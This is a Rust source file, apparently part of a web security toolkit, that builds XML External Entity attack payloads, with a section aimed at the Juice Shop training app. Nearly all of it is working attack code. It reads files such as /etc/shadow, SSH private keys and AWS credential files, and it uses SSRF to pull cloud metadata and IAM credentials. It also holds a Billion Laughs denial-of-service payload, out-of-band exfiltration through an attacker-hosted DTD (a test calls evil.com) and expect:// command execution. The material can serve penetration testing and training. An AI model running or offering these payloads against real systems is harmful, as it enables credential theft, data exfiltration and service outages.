//! XXE (XML External Entity) payload generation
//!
//! Provides various XXE payloads for file reading, SSRF, and DoS.

/// XXE payload with description
#[derive(Debug, Clone)]
pub struct XxePayload {
    pub name: String,
    pub payload: String,
    pub category: XxeCategory,
}

#[derive(Debug, Clone, PartialEq)]
pub enum XxeCategory {
    FileRead,
    Ssrf,
    DoS,
    OutOfBand,
    ParameterEntity,
}

impl XxePayload {
    pub fn new(name: impl Into<String>, payload: impl Into<String>, category: XxeCategory) -> Self {
        Self {
            name: name.into(),
            payload: payload.into(),
            category,
        }
    }
}

/// Generate file read XXE payload
///
/// # Example
///
/// ```rust
/// use web_security_toolkit::xxe::file_read_xxe;
///
/// let payload = file_read_xxe("/etc/passwd");
/// assert!(payload.contains("ENTITY"));
/// assert!(payload.contains("/etc/passwd"));
/// ```
pub fn file_read_xxe(file_path: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{}">
]>
<root>&xxe;</root>"#,
        file_path
    )
}

/// Generate SSRF XXE payload
pub fn ssrf_xxe(url: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{}">
]>
<root>&xxe;</root>"#,
        url
    )
}

/// Generate Billion Laughs DoS payload
pub fn billion_laughs_xxe() -> String {
    r#"<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
]>
<lolz>&lol6;</lolz>"#
        .to_string()
}

/// Generate Out-of-Band XXE payload (data exfiltration)
pub fn oob_xxe(attacker_url: &str, file_path: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{}">
  <!ENTITY % dtd SYSTEM "{}">
  %dtd;
]>
<root>&send;</root>"#,
        file_path, attacker_url
    )
}

/// Generate external DTD for OOB XXE
pub fn oob_dtd(attacker_url: &str) -> String {
    format!(
        r#"<!ENTITY % all "<!ENTITY send SYSTEM '{}?data=%file;'>">
%all;"#,
        attacker_url
    )
}

/// Common file read payloads
pub fn common_file_reads() -> Vec<XxePayload> {
    vec![
        XxePayload::new("Linux passwd", file_read_xxe("/etc/passwd"), XxeCategory::FileRead),
        XxePayload::new("Linux shadow", file_read_xxe("/etc/shadow"), XxeCategory::FileRead),
        XxePayload::new("Linux hosts", file_read_xxe("/etc/hosts"), XxeCategory::FileRead),
        XxePayload::new(
            "Windows hosts",
            file_read_xxe("C:/Windows/System32/drivers/etc/hosts"),
            XxeCategory::FileRead,
        ),
        XxePayload::new(
            "Proc environ",
            file_read_xxe("/proc/self/environ"),
            XxeCategory::FileRead,
        ),
        XxePayload::new(
            "SSH private key",
            file_read_xxe("/root/.ssh/id_rsa"),
            XxeCategory::FileRead,
        ),
        XxePayload::new(
            "AWS credentials",
            file_read_xxe("/home/ec2-user/.aws/credentials"),
            XxeCategory::FileRead,
        ),
    ]
}

/// Cloud metadata SSRF via XXE
pub fn cloud_metadata_xxe() -> Vec<XxePayload> {
    vec![
        XxePayload::new(
            "AWS metadata",
            ssrf_xxe("http://169.254.169.254/latest/meta-data/"),
            XxeCategory::Ssrf,
        ),
        XxePayload::new(
            "AWS IAM credentials",
            ssrf_xxe("http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            XxeCategory::Ssrf,
        ),
        XxePayload::new(
            "GCP metadata",
            ssrf_xxe("http://metadata.google.internal/computeMetadata/v1/"),
            XxeCategory::Ssrf,
        ),
        XxePayload::new(
            "Azure metadata",
            ssrf_xxe("http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            XxeCategory::Ssrf,
        ),
    ]
}

/// Juice Shop specific XXE payloads
pub fn juice_shop_xxe() -> Vec<XxePayload> {
    vec![
        XxePayload::new(
            "B2B Order XXE (file read)",
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <productId>1</productId>
  <quantity>1</quantity>
  <customerId>&xxe;</customerId>
</order>"#
                .to_string(),
            XxeCategory::FileRead,
        ),
        XxePayload::new(
            "XXE DoS (Billion Laughs)",
            billion_laughs_xxe(),
            XxeCategory::DoS,
        ),
        XxePayload::new(
            "XXE Data Access Challenge",
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"#
                .to_string(),
            XxeCategory::FileRead,
        ),
    ]
}

/// PHP filter XXE for base64 encoded file read
pub fn php_filter_xxe(file_path: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={}">
]>
<root>&xxe;</root>"#,
        file_path
    )
}

/// Expect protocol XXE for RCE (if PHP expect is enabled)
pub fn expect_xxe(command: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://{}">
]>
<root>&xxe;</root>"#,
        command
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_file_read_xxe() {
        let payload = file_read_xxe("/etc/passwd");
        assert!(payload.contains("<!ENTITY xxe SYSTEM"));
        assert!(payload.contains("file:///etc/passwd"));
        assert!(payload.contains("&xxe;"));
    }

    #[test]
    fn test_ssrf_xxe() {
        let payload = ssrf_xxe("http://internal:8080");
        assert!(payload.contains("http://internal:8080"));
    }

    #[test]
    fn test_billion_laughs() {
        let payload = billion_laughs_xxe();
        assert!(payload.contains("lol6"));
        assert!(payload.contains("<!ENTITY"));
    }

    #[test]
    fn test_oob_xxe() {
        let payload = oob_xxe("http://evil.com/dtd", "/etc/passwd");
        assert!(payload.contains("% file"));
        assert!(payload.contains("% dtd"));
    }

    #[test]
    fn test_common_file_reads() {
        let payloads = common_file_reads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.name.contains("passwd")));
    }

    #[test]
    fn test_juice_shop_xxe() {
        let payloads = juice_shop_xxe();
        assert!(payloads.iter().any(|p| p.name.contains("B2B")));
    }
}
